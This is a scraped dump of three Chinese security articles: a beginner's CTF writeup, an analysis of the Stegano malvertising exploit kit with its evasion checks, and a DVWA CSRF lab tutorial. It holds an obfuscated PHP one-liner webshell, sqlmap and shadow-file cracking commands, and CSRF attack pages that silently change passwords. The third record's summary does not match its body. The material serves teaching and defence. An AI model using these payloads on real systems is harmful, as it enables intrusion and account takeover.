"5ccbfa3a4f2f0a0a7a69c036","第一次接触CTF，只会做杂项和一点点Web题&hellip;&hellip;因为时间比较仓促，写的比较简略。以后再写下工具使用什么的。     纯新手，啥都不会。处于瑟瑟发抖的状态。一","Kong","第一次接触CTF，只会做杂项和一点点Web题……因为时间比较仓促，写的比较简略。以后再写下工具使用什么的。     纯新手，啥都不会。处于瑟瑟发抖的状态。一、MISC1.签到题     直接填入题目所给的SYC{We1c0m3_To_G33k_2O!6}       并且可以知道后边的题的Flag格式为 SYC{} 2.xiao彩蛋     题目提示关注微博，从Syclover Team 博客（http://blog.sycsec.com）可获取到三叶草小组微博，私信发送flag后即可得到。  3.闪的好快      一开始拖进PS分帧数查看，发现二维码都是一半一半不完整的……直接找了个在线分解了一下，共18帧，一帧一阵扫即可。 4.Come_game      打了一分钟就放弃了。手残党第一层三个刺那儿就过不去。关闭游戏后，发现生成两个文件，猜测DeadTime是保存死亡次数的，save1保存游戏关卡信息。      删除后这两个文件后，观察发现进入死亡次数、时间信息时，生成DeadTime，进出关卡后生成save1。      查看两个文件的修改时间（左为save1，右为DeadTime），在试玩时保持了在第一关存档点时不死亡，因此可以知道之前的猜测是正确的。       用十六进制编辑器HexEditXP打开save1，修改关卡信息，尝试后发现共5关，修改即可。5.Snow     打开网页，查看源码得到key。     提示是html隐写，通过关键词搜索，可以查到有snow隐写。将key和网址一并丢入解码网（http://fog.misty.com/perry/ccs/snow/snow/snow.html），就可以得到Flag。6.旋转跳跃     一个mp3文件，题目写着“熟悉的声音中貌似又隐藏着啥”，由题目信息，可以知道是MP3隐写，使用MP3stego（http://www.petitcolas.net/steganography/mp3stego/）可解。7.凯撒部长的奖励      给了一串类似于Flag格式的字符串，结合题目“凯撒”，可以知道是凯撒加密，以Flag格式可知需要将MSW移至SYC，即右移6位即可。可以写代码跑，也可以丢进相关的解密网站跑。8.MD5cracker      给定字符串01540f319ff0cf88928c83de23l27fbb，根据题目提示进行MD5解密查询，发现无效。观察发现其中有个l，改为1，再次查询解密后得到Flag。9.PEN_AND_APPLE      给了一段极其羞耻的MP4格式的视频，由于是MISC题，联想到视频隐写，搜索之，但只查到WAV格式的。提示是Windows下命令行，查阅《数据隐藏技术解密》一书的Windows相关内容，了解到是NTFS数据流隐写。通过搜索可知使用相关工具进行解密。但第一次尝试时未出Flag，反而出现了自己在动手实验时修改过的隐藏内容（然后把自己给误导了）……    查阅后发现只能用WinRar进行解压，否则会使隐藏文件损失。    可以在命令行下提取（使用lads和streams进行操作）或者使用NTFS Stream Info工具查看。10.藏着小秘密的流量包      下载后发现是pcapng文件，根据提示“用手机共享”，搜索蓝牙传输协议，即OBEX，用WireShark分析，定位可以看到，传输了一个名为“secret.rar”的压缩包，提取出来就能得到Flag。二、Linux1.linux_1      在Ubuntu环境下进入docker，在 /usr/local/etc/geek/ 下取出第一个Flag。2.linux_2      通过docker目录文件查看，发现有个Flag2.swp，以“swp文件”为关键词进行搜索，查到这是vi非正常退出而产生的swp文件，通过vi -r {your file name} 这个命令可以恢复。3.linux_3     题目描述flag是某用户的登陆密码，通过Docker下查询发现有个用户名与syc相关的。     linux下用户密码的储存位置是/etc/passwd以及/etc/shadow     提取出来后，使用工具John，写字典进行爆破即可。     unshadow /etc/passwd /etc/shadow &gt; mypasswd参考资料：http://www.cnblogs.com/iamstudy/articles/linux_password_shadow.html               http://www.heblug.org/chinese_docker/userguide/              http://blog.csdn.net/lingdxuyan/article/details/4993868 三、Programcompress300      题目是一个300层的压缩包，且压缩包内文件无后缀名。      偷懒直接用了个按键精灵，不断解压、修改文件后缀。得到Flag。四、Reversere10-一起嗨皮      只会这个。觉得逆向学习周期太长，听了一位师傅的建议，暂时先放下了RE。      这题用OD找到字符串就可以啦……五、Web1.web_1    F12看一下HTTP响应头，得到Flag。2.web_2     打开网页，提示not admin     抓包，改一下whoami和root即可。3.Social Engineering     一道社工题。      通过在线社工库，用邮箱查询可以知道邮箱主人的姓名是“肖力”，下边提示说“有贴吧的伪男”，进入 百度“肖力吧”，可以看到在有一贴子在比赛时间点时发布，提供了一个QQ号。查看该QQ号内容。发现发了一张图……还以为是图片隐写，尝试无果。  于是查看留言板内容，发现提示域名的注册人联系号码就是Flag。然后上万网查询比赛官网WHOIS得到答案。4.sqli1      查看源码，有个tips。     可以得到参数是sycid，使用SQLMAP对该网址    （http://web.sycsec.com/d03e52c272e42e7c/?sycid=1）尝试注入（在Linux环境下）。     检测注入点——爆库——爆表段——爆字段——Dump。     sqlmap -u ""http://web.sycsec.com/d03e52c272e42e7c/?sycid=1"" -D sycsqli1 -T “#FL4G#” --columns      这里#FL4G#需要加个引号包含这个字段。 参考资料：http://nouername.github.io/2016/06/17/sql注入/               https://www.nigesb.com/sqlmap-common-usage-and-examples.html               http://www.legendsec.org/1111.html 5.sqli2    使用Burp抓包,改Debug=1     通过逻辑运算符XOR，使用万能密码，返回1即可6.人生苦短     “交提”计算结果后查看源代码，得到一大串编码，使用在线解码，发现是Base64和Base32转来转去，可以用Python调用内置的模块进行解码。7.狗师傅的计算器     写Writeup的时候已经无法访问这个网页了，只能回忆一下。     打开后发现是健脑操的一段代码。使用在线解码，得到一个welcome.php页面。     进入这个welcome页面，随意输入答案后，得到两个链接，有一个链接是robot.txt，联想到网站的robots协议，进入一下这个地址。     查看这个页面的内容，然后查询资料，有个include，知道这是一个文件包含。     参考http://www.cnblogs.com/iamstudy/articles/include_file.html ，查询php相关的内容，多次尝试得到一串编码，解密后得到Flag。8.上传1    看题目后，搜索文件上传漏洞。尝试上传一句话php，提示类型不支持。说明php后缀过滤，查看资料，说是phpstudy可以使用 .php/.php3/.php4/.phtml上传，经过测试，发现.phtml有效。    使用Burp改成.phtml后上传即可。参考资料：http://www.icookie.org/文件上传.html http://wenku.baidu.com/link?url=wx-44Vq4vEpWGOOVYj9ILZlulUiYDFEbCE5_siaZYdeZJ3g6vvudWNLbMnv5hXvpFYSprWkDUBtMYXk_wYka8VxhwIzETGVAtliBRS783j7 9.文件上传2      上传成功后，应当getshell了。      随意上传了一个一句话，访问地址，发现页面上直接显示出php代码了，调的脚本里，’php’被替换掉了，导致一句话无法写入。然而依然不会做。      之后经一位师傅提示，使用&lt;script&gt;的一句话绕过上传，使用菜刀连接了。      具体是哪句，不知道丢在哪儿了……所以没交给主办方…… ——————————————————————比赛官方推荐的学习链接：== web ==文件包含：http://www.cnblogs.com/iamstudy/articles/include_file.htmlsql注入：http://www.cnblogs.com/lcamry/category/846064.htmlsqli1/sqli2xss：https://github.com/l3m0n/XSS-Filter-Evasion-Cheat-Sheet-CN文件上传：http://wenku.baidu.com/link?url=wx-44Vq4vEpWGOOVYj9ILZlulUiYDFEbCE5_siaZYdeZJ3g6vvudWNLbMnv5hXvpFYSprWkDUBtMYXk_wYka8VxhwIzETGVAtliBRS783j7代码审计：http://wooyun.jozxing.cc/static/drops/papers-4544.html&lt;script language=""pHp""&gt;$k=""ass"".""ert""; $k(${""_PO"".""ST""} [‘8‘]);&lt;/script&gt;菜刀game.sycsec.com:50085/result.php?syc=php://filter/convert.base64-encode/resource=syc== misc ==隐写术：http://www.jianshu.com/p/67233f607f75snow\旋转跳跃编码与加密：http://www.tuicool.com/articles/2E3INnm凯撒部长的奖励== writeup ==第五届极客大挑战：http://wooyun.jozxing.cc/static/drops/tips-3434.html第六届极客大挑战：http://www.tuicool.com/articles/JfqMrq2","2016-11-09 12:00:26","CTF专题","2016第七季极客大挑战Writeup","http://nsoad.com/Article/CTF/20161109/726.html"
"5ccbfa3a4f2f0a0a7a69c037","如果你在过去的两个月内访问了任意主流网站，那么恭喜你，你的电脑很有可能已经中招了。","kong","一个广告Banner，不需要任何交互就能让你的PC感染恶意程序，是不是感觉很牛掰？据说就目前为止，已经有上百万PC因为这样的原因被感染。而且很多大型网站似乎都中招了，其中就包括雅虎和MSN，如果你最近看到过下面这样的广告，就真的要小心了！注意，只是看到就要小心。像素中的恶意代码安全公司ESET的恶意软件研究专家在本周二发布了报告，将这个Exploit Kit称为Stegano。Stegano可以将恶意代码嵌入banner广告的像素中，而这些banner广告通常都在一些广为人知的大型网站上，每日访问量超百万。按照ESET的说法，很多是新闻类媒体网站。Stegano第一次出现可以追溯到2014年，但是从今年10月初开始演变成了如今这种利用banner广告在各大型网站传播的方式。Stegano这个名字衍生于Steganography（隐写术）这个词，这门技术其实是通过一些技术手段将信息或内容隐藏在一些数字图像之中，因为肉眼不可见而实现所谓的隐形效果。其实Stegano是将恶意代码隐藏在透明PNG图像的阿尔法通道（Alpha Channel）之中，学设计的同学应该知道，图像的Alpha通道可以通过更改每一个像素的透明度值来定义它们的透明程度。而恶意代码的传递竟然是通过Alpha通道的值来传递的，实在是相当高端。接下来，就如大家所知道的那样，有人将这个包装后的恶意广告部署在了一些流量较大的主流网站上。    从左到右依次为初始版本；恶意版本和为了演示效果的恶意版本增强型“由于这种修改十分细微，被恶意修改过的广告跟初始版本看起来基本没有什么差别。”能看出来下面这两张图哪张是原图，哪张含恶意代码么~专家还提到，这些恶意广告会显示名为Browser Defence或者Broxu的软件宣传内容，隐蔽性极强！最近浏览大型网站，如果你也看到这两个软件的广告了，那就得警惕起来了！“这些banner广告位于URL为hxxps://browser-defence.com或hxxps://broxu.com的远程域。”发起了这次攻击的组织叫做AdGholas,他们擅长使用一些有效的技术手段来通过广告传播恶意软件，即大家所知道的恶意广告。他们上次实施攻击就在7月，仅在一天内就利用恶意软件感染了超过一百万PC。Malwarebytes恶意软件情报分析的负责人Jerome Segura提到，在短时间内阻止AdGholas的攻击还是可能实现的，但他们很快就可以利用在线广告的其他安全漏洞继续发起攻击。从Segura的观察来看，受灾的网站至少就包括了雅虎和MSN。“这是我见过手段最先进的恶意广告攻击之一。” Segura说道。Stegano原理一旦有用户访问了存在这种恶意广告的网站，这个嵌入在广告中的恶意脚本就可以在不跟用户交互的情况下将用户电脑的信息发送给攻击者的远程服务器。这个恶意脚本针对的是用IE浏览器的用户，它会先利用IE的CVE-2016-0162漏洞来扫描用户电脑，看看自己是否在沙箱或者某些安全软件的虚拟环境之中。在验证了用户浏览器之后，恶意脚本会通过TinyURL（短网址）服务将浏览器重定向到一个网址。之后会加载一个Flash文件，这个文件能够根据用户使用的不同Flash Player版本来利用Flash Player的不同漏洞(CVE-2015-8651,、CVE-2016-1019、CVE-2016-4117)，虽然这几个漏洞现在已经补上了。“在执行成功之后，Stegano会再次检查自己是否被监控，它的执行Shell代码会收集一些安全产品安装或者执行的数据，这些行为就可以看出Stegano的开发者十分多疑。”ESET的安全专家在blog中提到，“如果攻击者发现检查的结果没什么问题，就会试图再次从这个服务器下载一个加密payload，然后把它伪装成一个gif图片。”过程中会下载伪装的的“GIF图片”，再解密其中的payload，然后通过egsvr32.exe或rundll32.exe执行。恶意payloads的类型可能包括后门、间谍软件、银行木马、文件窃取等。下面这张ESET的图表可能能让你更直观的了解Stegano的攻击过程：2到3秒你就被黑了？以上所有操作都是自动的，仅发生在2到3秒之间，期间未与用户产生任何交互。截止目前，Stegano exploit kit已经被广泛利用，包括著名的Ursnif银行木马和Ramnit恶意软件。Stegano在2014年使用时，目标是荷兰用户；2015年春天开始针对捷克；到了最近，殃及范围扩大到加拿大、英国、澳大利亚、西班牙和意大利这5个国家。而且这次攻击中，Stegano每个攻击国家采用特定的exploit包，以达到最大范围的转播。    由于AdGholas对攻击目标电脑的安全环境进行多次审查，致使在研究他们攻击方式的时候也遇到了不少麻烦。最后他是用了一台家用电脑并下载了Wireshark，这个不会被监测到的网络抓包工具才让他有幸观察到了一次完整的攻击。Segura先是在11月27日发现了针对雅虎的攻击，没想到两天后恶意广告又出现了。AdGholas在这次攻击中仅仅是改变了域，连域所在的IP地址都没变。“如果没看出来的话我们就遇到大麻烦了。” Segura说道，“这些攻击在没有人意识到的情况下就已经发生了。”就算通过各种方式扫描恶意广告，但像AdGholas这样的入侵者还是防不胜防。“只要在线广告存在一天，问题同样存在。”Segura说，“当然，也不能够以偏概全，合法的在线广告还是占了大多数的。”ESET的报告中并没有提到受灾的具体包含哪些大型网站。对普通用户来说，最好的防御办法就是保证你的电脑运行最新版的软件和App，同时使用能监测到这种恶意广告的杀毒软件吧。有关Stegano的技术分析如前文所述，Stegona实际上2014年就已经出现了，不过当前的版本经过了极大加强。据ESET所说，和Stegona比起来，其他一些比较有名的Exploit Kits，比如说Angler和Neutrino实在是小巫见大巫了。在绝大部分感染场景中，存在问题的广告都会展示一个名叫Browser Defence的产品，最近还有在展示Broxu软件的。以下的分析仅针对Browser Defence。恶意广告本身位于browser-defence.com这个域名下，URI构造类似于下面这样（注意还是用的https）：hxxps://browser-defence.com/ads/s/index.html?w=160&amp;h=600这里的index.html会加载countly.min.js，为脚本提供提供初始参数。这里的countly可不是随便从GitHub复制一段代码，其中的代码进行了大量混淆和自定义修改。这些代码主要负责的是初始环境检查。随后初始环境信息会发回服务器（当成1×1 gif文件的XOR加密过的参数发回），形如下面这样：systemLocale^screenResolution^GMT offset^Date^userAgent^pixelRatio随后脚本就会请求广告Banner了。根据前面初始环境检查结果，返回恶意广告，或者也可能是不存在恶意的广告。脚本接下来就会加载Banner，然后读取RGBA结构（有兴趣的可以去了解RGBA color space色彩空间，即红绿蓝三个通道+Alpha通道）。如果说加载的是恶意banner，就会从图片的Alpha通道中解码一部分JS。至于具体怎么解码Alpha通道中的代码，这里面具体是有一套算法的，是不是感觉很有意思？详情参见ESET的原文。某些像素的Alpha通道包含了一些值，所以我们从图片中看起来，图片会呈现出一些噪点，主要就是因为这些存在恶意的值。现在知道上面这两张图的差别了吗？实际上，这也的确很难检测到。在成功解码之后，JS代码还会跟图片最后编码的哈希值来校验其完整性，最终再执行。这些代码才正式对计算机环境和浏览器本身进行检查，利用的是IE漏洞CVE-2016-0162。检查的主要是抓包、沙盒还有虚拟化软件是否存在，当然还有环境中是否存在安全软件；主要会检查下面这些东东是否存在：C:\Windows\System32\drivers\vmci.sysC:\Program Files\VMware\VMware Tools\vmtoolsd.exeC:\Program Files (x86)\VMware\VMware Tools\vmtoolsd.exeC:\Windows\System32\drivers\vboxdrv.sysC:\Windows\System32\vboxservice.exeC:\Program Files\Oracle\VirtualBox Guest Additions\VBoxTray.exeC:\Program Files (x86)\Oracle\VirtualBox Guest Additions\VBoxTray.exeC:\Windows\System32\drivers\prl_fs.sysC:\Program Files\Parallels\Parallels Tools\prl_cc.exeC:\Program Files (x86)\Parallels\Parallels Tools\prl_cc.exeC:\Windows\System32\VMUSrvc.exeC:\Windows\System32\VMSrvc.exeC:\Program Files\Fiddler\Fiddler.exeC:\Program Files (x86)\Fiddler\Fiddler.exeC:\Program Files\Fiddler2\Fiddler.exeC:\Program Files (x86)\Fiddler2\Fiddler.exeC:\Program Files\Fiddler4\Fiddler.exeC:\Program Files (x86)\Fiddler4\Fiddler.exeC:\Program Files\FiddlerCoreAPI\FiddlerCore.dllC:\Program Files (x86)\FiddlerCoreAPI\FiddlerCore.dllC:\Program Files\Charles\Charles.exeC:\Program Files (x86)\Charles\Charles.exeC:\Program Files\Wireshark\wireshark.exeC:\Program Files (x86)\Wireshark\wireshark.exeC:\Program Files\Sandboxie\SbieDll.dllC:\Program Files (x86)\Sandboxie\SbieDll.dll检查下来，如果一切顺利就会建立仅1个像素的iframe，设定window.name属性，通过HTTPS重定向至TinyURL。然后TinyURL再通过HTTP重定向至漏洞利用landing页面。漏洞利用阶段在成功重定向之后，landing页面会检查浏览器userAgent（IE），加载一个Flash文件，然后通过一个加密的JSON文件来设定FlashVars参数。在此，landing页面是作为中间人的角色存在的，提供基本的加密解密功能。FLash文件内实际上还嵌入了另一个Flash文件（和Neutrino类似），根据Flash版本采用3种不同的exploits。第二阶段，Flash文件会对FlashVars解密。其中包含了一个JSON文件（URI）、针对ExternalInterface的JS函数名、回调函数名和部分其他数据：{“a”:”\/e.gif?ts=1743526585&amp;r=10&amp;data=”,”b”:”dUt”,”c”:”hML”,”d”:true,”x”:”\/x.gif?ts=1743526585&amp;r=70&amp;data=”}接下来，就会通过ExtelnalInterface.call()来调用一个JS，检查Flash版本，然后通过landing页面发往服务器。这个过程是通过针对GIF文件请求的加密URI参数完成的。加密算法比较简单，用到了广告中的window.name。而服务器给出的响应就是个GIF图片，这个图片前面的部分字节会被丢弃，针对剩下的部分进行解密，然后回传给Flash。   实际上这里的响应就是个JSON，其中包含了利用三个漏洞（CVE-2015-8651、CVE-2016-1019或者是CVE-2016-4117）的指示字符，还有相应exploit的密码，以及为下一阶段payload做准备的shell code URI。Shell代码利用阶段的最后，shell代码解密，下载加密后的payload——整个过程还是伪装成GIF图片。在这个阶段，还是会再度执行一次检查，看看自己有没有被察觉。针对文件名包含下面这些字符的软件，它会格外在意。一旦发现有什么可疑的，就不会再下载payload：vmtoolsd.exeVBoxService.exeprl_tools_service.exeVBoxHook.dllSBIEDLL.DLLfiddler.execharles.exewireshark.exeproxifier.exeprocexp.exeollydbg.exewindbg.exeeset*, kasper*, avast*, alwil*, panda*, nano a*, bitdef*, bullgu*, arcabi*, f-secu*, g data*, escan*, trustp*, avg*, sophos*, trend m*, mcafee*, lavaso*, immune*, clamav*, emsiso*, superanti*, avira*, vba32*, sunbel*, gfi so*, vipre*, microsoft sec*, microsoft ant*, norman*, ikarus*, fortin*, filsec*, k7 com*, ahnlab*, malwareby*, comodo*, symant*, norton*, agnitu*, drweb*, 360*, quick hPayload部分接收到Payload之后，也就是上面说的GIF图片！GIF图片的前42个字节会被丢弃，对剩下的进行解密，通过下面的某一种方式将其保存到文件中：1.CreateFile, WriteFile2.CreateUrlCacheEntryA(*” http://google.com/”,,,,), CreateFileA, CreateFileMappingA, MapViewOfFile, {loop of moving bytes}, FlushViewOfFile, UnmapViewOfFile随后再通过regsvr32.exe或者rundll32.exe来执行payload。ESET的分析发现了下面这些payload会被下载，应该还有其他的payload。Win32/TrojanDownloader.Agent.CFHWin32/TrojanDownloader.Dagozill.BWin32/GenKryptik.KUMWin32/Kryptik.DLIF从整个过程来看，这个恶意广告的作者还是花了相当多的心思来确保隐蔽性。不过鉴于利用的漏洞都已经被修复，所以将软件升级到最新版，这个看起来非常有趣和恐怖的攻击过程就无法得逞了。","2016-12-09 15:15:34","Web安全","可能是史上最先进的恶意广告攻击：一个Banner就感染了上百万PC，雅虎、MSN等大型网站都中招","http://nsoad.com/Article/web/20161209/906.html"
"5ccbfa3a4f2f0a0a7a69c038","简要描述CMSEasy官方在2016-10-12发布了一个补丁,描述只有两句话前台getshell漏洞修正；命令执行漏洞修正；我们就根据补丁来分析一下这个前台Getshell漏洞。","Kong","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，并且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。DVWA简介DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。DVWA的搭建Freebuf上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（http://www.freebuf.com/sectool/102661.html）已经写得非常好了，在这里就不赘述了。之前介绍了Brute Force模块（http://www.freebuf.com/articles/web/116437.html）、Command Injection模块（http://www.freebuf.com/articles/web/116714.html）的内容，本文介绍的是CSRF模块，后续教程会在之后的文章中给出。CSRF(Cross-site request forgery) CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。 下面对四种级别的代码进行分析。Low服务器端核心代码&lt;?php if( isset( $_GET[ 'Change' ] ) ) {     // Get input     $pass_new  = $_GET[ 'password_new' ];     $pass_conf = $_GET[ 'password_conf' ];     // Do the passwords match?     if( $pass_new == $pass_conf ) {         // They do!         $pass_new = mysql_real_escape_string( $pass_new );         $pass_new = md5( $pass_new );         // Update the database         $insert = ""UPDATE `users` SET password = '$pass_new' WHERE user = '"" . dvwaCurrentUser() . ""';"";         $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );         // Feedback for the user         echo ""&lt;pre&gt;Password Changed.&lt;/pre&gt;"";     }     else {         // Issue with passwords matching         echo ""&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"";     }     mysql_close(); } ?&gt; 可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现= =）。    漏洞利用1、构造链接A) 最基础的:http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#当受害者点击了这个链接，他的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。    有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。B) 我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：如http://dwz.cn/****因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。C) 构造攻击页面现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。&lt;img src=""http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#"" border=""0"" style=""display:none;""/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。Medium服务器端核心代码&lt;?php if( isset( $_GET[ 'Change' ] ) ) {     // Checks to see where the request came from     if( eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] ) ) {         // Get input         $pass_new  = $_GET[ 'password_new' ];         $pass_conf = $_GET[ 'password_conf' ];         // Do the passwords match?         if( $pass_new == $pass_conf ) {             // They do!             $pass_new = mysql_real_escape_string( $pass_new );             $pass_new = md5( $pass_new );             // Update the database             $insert = ""UPDATE `users` SET password = '$pass_new' WHERE user = '"" . dvwaCurrentUser() . ""';"";             $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );             // Feedback for the user             echo ""&lt;pre&gt;Password Changed.&lt;/pre&gt;"";         }         else {             // Issue with passwords matching             echo ""&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"";         }     }     else {         // Didn't come from a trusted source         echo ""&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"";     }     mysql_close(); } ?&gt; 相关函数说明int eregi(string pattern, string string)检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击。漏洞利用过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.153.130）我们可以将攻击页面命名为192.168.153.130.html（页面被放置在攻击者的服务器里，这里是10.4.253.2）就可以绕过了下面是Burpsuite的截图Referer参数完美绕过过滤规则 密码修改成功High服务器端核心代码&lt;?php if( isset( $_GET[ 'Change' ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $pass_new  = $_GET[ 'password_new' ];     $pass_conf = $_GET[ 'password_conf' ];     // Do the passwords match?     if( $pass_new == $pass_conf ) {         // They do!         $pass_new = mysql_real_escape_string( $pass_new );         $pass_new = md5( $pass_new );         // Update the database         $insert = ""UPDATE `users` SET password = '$pass_new' WHERE user = '"" . dvwaCurrentUser() . ""';"";         $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );         // Feedback for the user         echo ""&lt;pre&gt;Password Changed.&lt;/pre&gt;"";     }     else {         // Issue with passwords matching         echo ""&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"";     }     mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。漏洞利用要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。&lt;script type=""text/javascript""&gt;    function attack()  {   document.getElementsByName('user_token')[0].value=document.getElementById(""hack"").contentWindow.document.getElementsByName('user_token')[0].value;  document.getElementById(""transfer"").submit();   }&lt;/script&gt;&lt;iframe src=""http://192.168.153.130/dvwa/vulnerabilities/csrf"" id=""hack"" border=""0"" style=""display:none;""&gt;&lt;/iframe&gt;&lt;body onload=""attack()""&gt;  &lt;form method=""GET"" id=""transfer"" action=""http://192.168.153.130/dvwa/vulnerabilities/csrf""&gt;   &lt;input type=""hidden"" name=""password_new"" value=""password""&gt;    &lt;input type=""hidden"" name=""password_conf"" value=""password""&gt;   &lt;input type=""hidden"" name=""user_token"" value=""""&gt;  &lt;input type=""hidden"" name=""Change"" value=""Change""&gt;   &lt;/form&gt;&lt;/body&gt;攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。然而理想与现实的差距是巨大的，这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问的地址是http://192.168.153.130/dvwa/vulnerabilities/csrf，位于服务器192.168.153.130上，而我们的攻击页面位于黑客服务器10.4.253.2上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.153.130中，才有可能完成攻击。下面利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token）。这里的Name存在XSS漏洞，于是抓包，改参数，成功弹出token注入代码如下Impossible服务器端核心代码&lt;?php if( isset( $_GET[ 'Change' ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $pass_curr = $_GET[ 'password_current' ];     $pass_new  = $_GET[ 'password_new' ];     $pass_conf = $_GET[ 'password_conf' ];     // Sanitise current password input     $pass_curr = stripslashes( $pass_curr );     $pass_curr = mysql_real_escape_string( $pass_curr );     $pass_curr = md5( $pass_curr );     // Check that the current password is correct     $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );     $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );     $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );     $data-&gt;execute();     // Do both new passwords match and does the current password match the user?     if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {         // It does!         $pass_new = stripslashes( $pass_new );         $pass_new = mysql_real_escape_string( $pass_new );         $pass_new = md5( $pass_new );         // Update database with new password         $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );         $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );         $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );         $data-&gt;execute();         // Feedback for the user         echo ""&lt;pre&gt;Password Changed.&lt;/pre&gt;"";     }     else {         // Issue with passwords matching         echo ""&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"";     } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。","2016-11-03 18:18:30","Web安全","新手指南：DVWA-1.9全级别教程之CSRF","http://nsoad.com/Article/web/20161103/689.html"
